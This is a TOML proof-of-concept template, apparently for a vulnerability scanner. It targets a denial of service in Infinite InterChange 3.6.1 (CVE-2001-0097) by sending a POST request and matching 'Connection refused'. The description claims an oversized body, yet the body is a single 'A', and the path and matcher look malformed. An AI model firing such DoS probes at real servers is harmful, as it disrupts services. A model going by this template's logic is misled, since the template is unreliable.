[info]
author = "AVE"
description = "通过发送超大 POST 请求体导致 Infinite InterChange 3.6.1 Web 服务崩溃的拒绝服务验证"
id = "POC-AVE-2001-0040"
name = "Infinite InterChange 3.6.1 DoS PoC"
severity = "medium"
tags = ["ave-2001-0040"]
vuln_id = [
    "CVE-2001-0097",
    "AVE-2001-0040",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = "A"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Connection refused"]
